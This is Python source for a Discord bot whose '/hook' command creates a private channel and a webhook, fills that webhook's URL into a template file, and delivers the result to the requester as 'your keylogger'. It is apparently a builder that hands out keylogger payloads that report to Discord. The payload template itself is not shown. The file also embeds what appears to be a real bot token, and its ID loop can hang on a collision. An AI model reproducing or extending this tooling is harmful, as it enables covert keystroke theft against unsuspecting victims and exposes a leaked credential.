import asyncio
import random
import discord
from discord.errors import HTTPException
from discord.ext import commands
from myconfig import *
import shutil

# TODO: write the code to store the ID files


intents = discord.Intents.default()
intents.message_content = True

rand = random.randint(1, 100000)
bot = commands.Bot(command_prefix='/', intents=intents)

def replace_text_in_file(filepath, old_text, new_text):
    with open(filepath, 'r+') as file:
        file_contents = file.read()
        file.seek(0)  
        file.write(file_contents.replace(old_text, new_text))
        file.truncate()

@bot.command()
async def bonjour(ctx):
    await ctx.send(f"Bonjour {ctx.author}!")

@bot.command()
async def hook(ctx):
    async def number_exists():
        with open("IDfile.txt", "r") as IDfile:
            existing_numbers = IDfile.read().splitlines()
            return str(rand) not in existing_numbers


    unique_number_found = False
    while not unique_number_found:
        if await number_exists():
            unique_number_found = True
            with open("IDfile.txt", "a") as IDfile:
                IDfile.write(str(rand) + "\n")

            try:
                overwrites = {
                    ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                    ctx.author: discord.PermissionOverwrite(read_messages=True)
                }
                category_name = "Bot Channels"
                category = discord.utils.get(ctx.guild.categories, name=category_name)
                if not category:
                    category = await ctx.guild.create_category_channel(category_name)

                channel = await ctx.guild.create_text_channel(f"private-{rand}", overwrites=overwrites, category=category)
                await channel.set_permissions(ctx.author, read_messages=True)
                await safe_send(channel, f"Votre ID de hook est {rand}.")
                await safe_send(channel, f"this is your keylogger :")
                webhookname = f"webhook n'{rand}'"
                webhook = await channel.create_webhook(name=webhookname)
                created_webhook = next((w for w in await ctx.guild.webhooks() if w.name == webhookname), None)
                shutil.copy('webhookcontent.txt', f'{rand}.txt')
                if created_webhook:
                    content = created_webhook.url 
                else:
                    content = "Webhook not found."
                replace_text_in_file(f'{rand}.txt', 'webhookfirsturl', content)
            
                await safe_send(webhook, file=discord.File(f'{rand}.txt'))
            except Exception as e:
                await ctx.send(f"Failed to create channel or send message: {e}")
                print(e)

async def safe_send(channel, content=None, file=None):
    retries = 3
    for _ in range(retries):
        try:
            if content:
                await channel.send(content)
            elif file:
                await channel.send(file=file)
            break  
        except HTTPException as e:
            if "rate limit exceeded" in str(e).lower():
                await asyncio.sleep(1)  
            else:
                raise 

token = "MTI3MzY5MTgwMTgxMDYzNjg4NA.GyDXnJ.M9hGqxv8Gi9u_P3hUOtv0O9lrxNl4B4UT2nK7A"
bot.run(token)

        
    